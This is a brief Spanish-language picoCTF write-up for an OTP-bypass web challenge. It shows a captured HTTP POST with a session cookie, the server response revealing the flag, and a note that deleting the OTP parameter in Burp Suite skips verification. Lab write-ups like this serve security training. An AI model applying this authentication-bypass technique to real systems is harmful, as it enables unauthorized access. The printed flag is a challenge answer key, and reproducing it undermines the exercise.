## Objetivo
Try [here](http://titan.picoctf.net:55396/) to find the flag
## Solución
```bash
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:55396
Content-Length: 9
Cache-Control: max-age=0
Accept-Language: es-ES,es;q=0.9
Origin: http://titan.picoctf.net:55396
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:55396/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxVjEsKAyEQBe_iOgsnKtFcRlrtJkPGD34IIeTu49JZVvFe_Zjf-5c9GYS4J3ZjvlWyPb8xTWmCJEeBAxIZxSU8gLuNNu2FIy4xcHNXisz80TgOmyDi0sq9TFJSC6EnFmjtk2tYFuWVE9o0osO66NGwXlr_E1jWNS4.Zx2tdA.M9l5Ui8MtuG8XzRY8p7pkJ3FrKk
Connection: keep-alive

otp=12345
```

```bash
Welcome, admin you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
```
## Notas Adicionales
Usando burpsuite evitamos la verificacion otp solamente quitando la linea que especifica el otp en el metodo post.
### Referencias